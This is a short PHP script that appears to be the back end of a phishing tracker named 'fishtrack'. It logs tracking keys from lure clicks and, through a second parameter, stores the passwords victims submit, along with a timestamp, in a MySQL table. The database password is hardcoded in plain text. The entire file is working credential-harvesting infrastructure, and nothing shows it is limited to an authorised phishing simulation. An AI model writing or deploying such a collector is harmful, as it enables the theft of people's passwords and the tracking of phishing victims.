<?php
    $servername = "localhost";
    $username   = "tracker";
    $password   = "fishtracker67";
    $dbname     = "fishtrack";
if (isset($_GET['k'])) {
    $conn = new mysqli($servername, $username, $password, $dbname);
    $stmt = $conn->prepare( "INSERT INTO fishlog (track_key, datetime) VALUES (? , NOW())" );
    $stmt->bind_param("s", $_GET['k']);
    $stmt->execute();
    $stmt->close();
    $conn->close();
}
elseif (isset($_GET['k2'])){
    $conn = new mysqli($servername, $username, $password, $dbname);
    $stmt = $conn->prepare( "INSERT INTO fishlogpwd (track_key, datetime, password) VALUES (? , NOW(), ?)" );
    $stmt->bind_param("ss", $_GET['k2'], $_GET['p']);
    $stmt->execute();
    $stmt->close();
    $conn->close();
}
?>
